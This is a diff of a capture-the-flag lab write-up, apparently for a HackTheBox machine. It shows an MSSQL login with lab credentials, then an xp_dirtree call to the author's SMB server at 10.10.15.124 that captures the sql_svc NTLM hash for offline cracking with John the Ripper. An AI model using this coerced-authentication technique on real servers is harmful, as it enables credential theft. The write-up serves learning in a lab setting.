@@ -214,7 +214,30 @@ We know that we can access the mssql server running on the host using the cred `
 
 We can connect to it using `impacket-mssqlclient`
 
+But while i tried using impacket-mssqlclient i had some library issues and coudln't fix it 
+
+So i decided to use `sqsh`
+
 ```
-b
+└─$ sqsh -S sequel.htb -U PublicUser -P GuestUserCantWrite1
+sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
+Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
+This is free software with ABSOLUTELY NO WARRANTY
+For more information type '\warranty'
+1> 
+```
 
+Now that i'm connected i'll try to see if i can access external shares which will lead to ntlm hash theft 🤓
 
+First i'll set up an smbserver then run the command
+
+```
+xp_dirtree '\\10.10.15.124\share'  
+```
+
+Here's the command 
+![image](https://user-images.githubusercontent.com/113513376/221429699-f0bbc811-584b-4060-a44b-cfb23f300455.png)
+
+We now have the hash for user sql_svc 
+
+I'll save it in a file and brute force using JTR
